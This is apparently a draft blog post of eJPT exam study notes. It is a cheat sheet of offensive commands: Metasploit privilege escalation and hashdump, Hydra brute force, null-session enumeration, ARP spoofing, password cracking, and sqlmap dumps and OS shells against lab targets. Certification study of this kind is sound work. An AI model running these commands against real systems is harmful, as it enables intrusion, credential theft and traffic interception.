+++
date = '2024-11-19T21:15:08+01:00'
draft = true
title = 'eJPT Exam Prep'
+++

# Metasploit

Basic Commands

```
search x
use x
info
show options, show advanced options
SET X (e.g. set RHOST 10.10.10.10, set payload x)
```

Meterpreter Commands

```
background
sessions -l
sessions -i 1
sysinfo, ifconfig, route, getuid
getsystem (privesc)
bypassuac
download x /root/
upload x C:\\Windows
shell
use post/windows/gather/hashdump
```

# Networking Attacks

Brute Force with Hydra

```
hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

Windows Shares with null sessions

```
nmblookup -A 10.10.10.10
smbclient -L //10.10.10.10 -N (list shares)
smbclient //10.10.10.10/share -N (mount share)
enum4linux -a 10.10.10.10
```

ARP Spoofing

```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
```

---
description: Using enum4linux and samrdump.py
---

# Null Sessions

```
enum4linux -n IP
enum4linux -P IP
enum4linux -s /user/share/enum4linux/share-list.txt IP
enum4linux -a IP

cd /usr/share/doc/python-impacket-doc/examples
python samrdump.py IP 

nmap -script=smb-enum-shares IP
nmap -script=smb-enum-users IP
nmap -script=smb-brute IP
```

# Password Bruteforce

First we need to prepare the file for John

```
unshadow passwd shadow > unshadow
```

For hash cracking:

```
john -wordlist /path/to/wordlist -users=users.txt hashfile
```

# Scanning

Best NMAP Scan

```
sudo nmap -T4 -Pn -n -vv -p- -A --open -iL ips.txt
```

Whois

```
whois site.com
```

Ping sweep

```
fping -a -g 10.10.10.0/24 2>/dev/null
nmap -sn 10.10.10.0/24
```

OS Detection

```
nmap -Pn -O 10.10.10.10
```

Nmap Quick Scan

```
nmap -sC -sV 10.10.10.10
```

Nmap Full Scan

```
nmap -sC -sV -p- 10.10.10.10
```

Banner Grabbing

```
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
```

More Banner Grabbing

```
nmap -sV --script=banner 192.73.96.0/24
```

More Nmap port discovery without ping sweep

```
nmap -p- -Pn -vv -T4 -n IP
```

Port information

```
nmap -sC -sV -p PORT IP
```

Lookup of Nmap scripts

```
locate .nse
```

Vulnerability searching Nmap

```
nmap -sV -sC --script vuln -oN blue.nmap 10.10.126.213
```

Nmap SynScan usefull for nullsessions (enum4linux next)

```
nmap -sS -p 135,139,445 IP.0-255
```

# SQLi

```
sqlmap -u http://10.10.10.10 -p parameter
sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
sqlmap -u http://10.10.10.10 --os-shell
sqlmap -u http://10.10.10.10 --dump
--cookie !!
```

Example:

<pre><code><strong>sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title
</strong><strong>sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs
</strong>sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
</code></pre>

This last example is for a GET sql injection. For a POST injection save the post from burpsuite and execute the following command.

```
sqlmap -r request -p title
```

# Subdomain Enumeration

Dirsearch or gobuster are both good options

```
dirsearch.py -u http://10.10.10.10 -e *
gobuster -u 10.10.10.10 -w /path/to/wordlist.txt
```

# Vuln Assessment

Rapid7

```
{% embed url="https://www.rapid7.com/db/" %}
```

Exploit-DB

```
{% embed url="https://www.exploit-db.com/" %}
```

# XSS

Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload&#x20;

Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post

```
1. Find a reflection point
2. Test with <i> tag
3. Test with HTML/JavaScript code (alert('XSS'))
```

